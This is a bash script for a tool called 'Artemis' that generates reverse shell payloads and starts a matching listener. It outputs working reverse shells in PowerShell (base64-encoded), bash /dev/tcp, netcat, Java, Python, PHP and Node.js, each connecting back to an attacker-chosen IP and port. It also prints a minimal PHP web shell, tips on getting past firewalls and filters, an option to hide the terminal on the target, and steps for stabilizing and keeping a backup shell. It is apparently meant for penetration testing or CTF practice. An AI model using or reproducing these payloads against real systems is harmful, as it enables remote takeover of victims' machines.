#!/bin/bash

#To-DO: Add Ruby & Perl payloads
line="\n============================================================\n"

Help()
{
        echo -e "$line\nArtemis will run in interactive mode unless all arguments are supplied\nThese payloads are not intended to bypass Antivirus\n\n"
	echo -e "This script supports the following arguments:\n\n-h: Display this help message\n\n"
	echo -e "-a: Generate commands for Pivoting in Active Directory, instead of Reverse shell payloads. If used, all other arguments will be ignored\n\n"
	echo -e "-i <IP_Address>: The IP Address to listen on\n\n-p <port>: The port to listen on (common port numbers are more likely to bypass your target's firewall!)\n\n"
	echo -e "-l: Start a listener using specified interface and port (Don't use this option if you are starting a listener manually)\n\n"
	echo -e "-t <Target_OS>: Specify the target OS for Web shell payloads & for stabilization tips [win/nix]\n\n"
	echo -e "-s <Payload_Type>: Specify the type of Reverse shell to generate (Refer to the Payloads section for a list of accepted arguments)\n$line"
	echo -e "[Example Syntax]\n\nReverse Shell: artemis -i 10.10.144.68 -p 443 -s ps -t nix -l\n\nAD Pivoting: artemis -a\n$line"	
	echo -e "Payloads:\n\n[ps] Powershell\n[bash]\n[nc] Netcat (*nix targets)\n[java]\n[py] Python (*nix targets)\n[php] (*nix targets)"
	echo -e "[node] Node.js (*nix targets)\n\n"
	echo -e "[!] Tip: If you're having trouble catching a shell, try the following steps-\n\n1) Double check your firewall settings & verify target's IP Address\n"
	echo -e "2) Instead of getting a Reverse Shell, start capturing ICMP packets and use a payload to make the target ping you a few times\n"
	echo -e "3) Use common ports for your Reverse shell (e.g. 80 or 443) or try ports that hosts in your target's LAN are using\n"
}

PowerSHELL()
{

	text="\$Text = '\$client = New-Object System.Net.Sockets.TCPClient(\"$host\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'"

	ops='$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text); $EncodedText =[Convert]::ToBase64String($Bytes); $EncodedText'

	payload=$(echo -n "$text; $ops" | pwsh -Command -)

}

if [ $# -eq 0 ]
then
	echo -e "\nNo arguments provided. Defaulting to interactive mode.\n\n[!] Tip: Use the -h argument to view the help menu\n"

else
#The : after an option means it requires an argument. A : in front of options lets you handle errors
	while getopts ":hi:p:ls:t:a" option; do
		case $option in
			h)
				Help
				exit;;
			i)
				host=$OPTARG;;

			p)
				port=$OPTARG;;

			l)
				listen=1;;

			s)
				shell=$OPTARG;;

			t)
				target=$OPTARG;;

			a)
				ad=0;;
			
			\?)
				echo -e "\nError: Invalid argument"
				exit;;
		esac
		done

fi

if [ -z "$ad" ] && [ $# -eq 0 ] 
then
	echo -e "\nSelect an operation:\n[1] Generate Reverse shell payload\n[2] Perform Active Directory pivoting\n"
	read pivot

	if [ "$pivot" == 2 ]
	then
		ad=0
	else
		ad=1
	fi

fi

if [ "$ad" == 0 ]
then
	source $(readlink $(which artemis) | awk -F 'artemis.sh' '{print $1}')ad_LateralMove.sh
	exit
fi

if [ -z "$host" ]
then
	echo -e "\nThe following interfaces have been detected:\n"
	ip -c a
	echo -e "\nEnter your IP Address: "
	read host
	echo -e "$line"
fi

if [ -z "$port" ]
then
        echo "Enter the Listener's port number"
        read port
        echo -e "$line"
fi

if [ -z "$shell" ]
then
	echo -e "\nSelect an operation:\n\n[1] Powershell\n[2] Bash\n[3] Netcat\n[4] Java\n[5] Python\n[6] PHP\n"
	read mode
else
	if [ "$shell" == "ps" ]
	then
		mode=1
	elif [ "$shell" == "bash" ]
	then
		mode=2
	elif [ "$shell" == "nc" ]
	then
		mode=3
	elif [ "$shell" == "java" ]
	then
		mode=4
	elif [ "$shell" == "py" ]
	then
		mode=5
	elif [ "$shell" == "php" ]
	then
		mode=6
	elif [ "$shell" == "node" ]
	then
		mode=7
	else
		echo -e "\nError: Invalid payload selected\nView the help menu with: artemis -h\n"
		exit
	fi
fi

if [ $mode == 1 ]
then
	echo -e "\nOutputting an Encoded Powershell payload for $host:$port\n"

	PowerSHELL
	echo -e "\n[!] Tip: The Basic Syntax is more reliable, but it may not run as a 64-bit process depending on the context that the payload is executed in. You can try to force the target to run Powershell (x64) using the x64 Syntax\n\n$line"

	echo -e "\nBasic Syntax:\n\npowershell -enc $payload"

	echo -e "\n\nx64 Syntax:\n\n"
	echo "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -enc $payload"

	echo -e "\n\n[+] Additional Arguments: Optionally add other parameters like '-NoP' (NoProfile) & '-W Hidden' (Hide terminal on the target machine)\n$line" 

elif [ $mode == 2 ]
then
	echo -e "\nOutputting Bash payloads for $host:$port\n\n" 
	echo -e "[!] Tip: URL-Encoding the Basic Payload can break it. Try the B64 Payload if you need to URL-Encode it, or bypass basic filters\n\n"

	basic="bash -i >& /dev/tcp/$host/$port 0>&1"

	b64=$(echo -n "$basic" | base64)

	echo -e "Basic Payload:\n$basic"

	echo -e "\n\nB64 Payload:\necho $b64|base64 -d|bash"


elif [ $mode == 3 ]
then
	echo -e "\nOutputting Netcat payloads for a Linux target using $host:$port\n\n[!] Tip: Named Pipe Payload is preferred and Alternate Payload only works for certain versions of Netcat\n\n"

	echo -e "Named Pipe Payload:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f\n\n"

	echo -e "Alternate Payload:\nnc -e /bin/sh $host $port"

elif [ $mode == 4 ]
then
	if [ -z "$target" ]
	then
		echo -e "Specify the target's OS:\n[1] Linux\n[2]Windows\n"
		read opt
	
		if [ $opt == 1 ]
		then
			target="nix"

		elif [ $opt == 2 ]
		then
			target="win"

		else
			echo -e "\nYou did not select a valid option\nExitting\n"
			exit
		fi

	fi

	if [ "$target" == "nix" ]
	then
		echo -e "\nOutputting a Java payload for Linux target using $host:$port\n\n"

		echo "r = Runtime.getRuntime()"
		echo "p = r.exec([\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/$host/$port; cat <&5 | while read value; do \\\$value 2>&5 >&5; done\"] as String[])"
		echo "p.waitFor()"

	elif [ "$target" == "win" ]
	then
		PowerSHELL
		echo -e "\nOutputting a Java payload for Windows target using $host:$port\n\n"
		echo -e "$line\nWARNING: Verify this works with the space after payload / before the quotes in line 2. The PowerSHELL function adds the space\n$line"
		echo "r = Runtime.getRuntime()"
		echo -n "p = r.exec([\"powershell.exe\", \"-enc\","; echo -n \"$payload\"; echo "] as String[])"
#		echo "p = r.exec([\"powershell.exe\", \"-enc\", \"$payload\"] as String[])"
		echo "p.waitFor()"

	fi

elif [ $mode == 5 ]
then
	echo -e "\n[!] Tip: Depending on the target, you may need to substitute 'python3' for 'python' or 'python2'. This payload is for a Linux target.\n\n"
	echo -e "Outputting a Python payload for $host:$port\n"

	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

elif [ $mode == 6 ]
then

	echo -e "\n{Generic Web Shell Payload}\n\n"
	echo -e "[!] Tip: This is the smallest possible payload, & it should work on any PHP server.\n\nIf you're adding the payload to an existing file, append the PHP closing tags ?>\n\nNavigate to the file's URL to execute commands (e.g. https://example.com/shell.php?0=whoami)\n\nTiny Payload:\n"

	echo '<=`$_GET[0]`'

	echo -e "$line\n{Linux Payloads}\n\n"
	echo -e "[!] Tip: You can use PHP to execute other payloads by placing them inside the exec() or system() functions (e.g. for a Windows Target).\n"
	echo -e "Outputting PHP payloads for $host:$port\n\n\nBasic Payload (String):\n"

	echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	echo -e "\n\nAlternate Payload (PHP tags):\n"
	echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\");?>"

elif [ $mode == 7 ]
then
	echo -e "\nOutputting Node.js Payload for $host:$port\n\n"
	echo "require('child_process').exec('bash -i >& /dev/tcp/$host/$port 0>&1');"

else
	echo -e "\nYou did not select a valid option\n"
	exit
fi

echo -e "$line"

if [ -z "$target" ]
then
	echo -e "$line\n{Stabilization Tricks} Select your target's OS:\n[0] Skip Stabilization\n[1] Linux Target\n[2] Windows Target\n"
	read opt

	if [ $opt == 0 ]
	then
		target="skip"

	elif [ $opt == 1 ]
	then
		target="nix"

	elif [ $opt == 2 ]
	then
		target="win"

	else
		echo -e "\nYou did not select a valid option\n"
	fi
fi

if [ "$target" == "skip" ]
then
	echo -e "\nSkipping...\n$line"

elif [ "$target" == "nix" ]
then
	echo -e "\n\n{Manually Stabilizing a Linux Shell}\n"
	echo -e "1) Identify SW on target:\n\nwhich python python2 python3 ruby perl lua\n"
	echo -e "2) Example Commands:\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
	echo -e "perl -e 'exec \"/bin/sh\";'\nruby -e 'exec \"/bin/sh\"'\nlua -e \"os.execute('/bin/sh')\"\n"
	echo -e "3) Set Shell Type:\nexport SHELL=bash\n\n"
	echo -e "4) Set Terminal Type:\nexport TERM=xterm-256color\n\n"
#	echo -e "5) {Optional} Configure Attacker's Terminal:\nA) Background Reverse Shell:\nPress CTRL+Z\n\n"
#	echo -e "B) Disable Attacker's Echo:\nstty raw -echo\n\nC) Get Size of Terminal Window:\nstty size\n(Changes if you resize Terminal!)\n\n"
#	echo -e "D) Foreground Reverse Shell:\nfg\n(Press \"Enter\" a couple times)\n\n"
#	echo -e "E) Set Reverse Shell Terminal Size:\nstty rows X columns Y\n(Replace X & Y with the numbers from Step C)\n\n"
	echo -e "[!] Tip: You may be able to create SSH Keys on the target machine and use them for an upgraded shell\n$line" 

elif [ "$target" == "win" ]
then
	echo -e "\n\n{Manually Stabilizing a Windows Shell}\n"
	echo -e "Use this shell to create a \"Backup Shell\" that you'll use. It may be more stable, but it's mainly in case you cause the shell to freeze while using it.\n\nSetup:\n"
	echo "1) Navigate to a Writable Directory:"; echo "cd \users\public"
	echo -e "\n2) Create a file with your payload [May be bad advice. These may want an EXE, like the Process command]:\nWrite-Output \"PAYLOAD\" > shell.ps1\n\nMethods:\n"
	echo "1) Process: (Try with and without \"-NoNewWindow\")"; echo "Start-Process -FilePath \"powershell\" -ArgumentList \"-enc ENCODED\""
	echo -e "\n2) Job:"; echo "Start-Job .\shell.ps1"
	echo -e "\n3) Run in foreground:\n"; echo "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe \Users\Public\shell.ps1"


else
	echo -e "\nYou did not select a valid option\n"
fi

echo -e "$line"

if [ -z "$listen" ]
then
	echo -e "\nDo you want to automatically start a listener? [y/N]\n\n"
	read opt
	echo -e $line
	if [ "$opt" == "y" ]
	then
		listen=1
	else
		exit
	fi
fi

if [ $listen == 1 ]
then
	rlwrap ncat -lvnp $port
fi
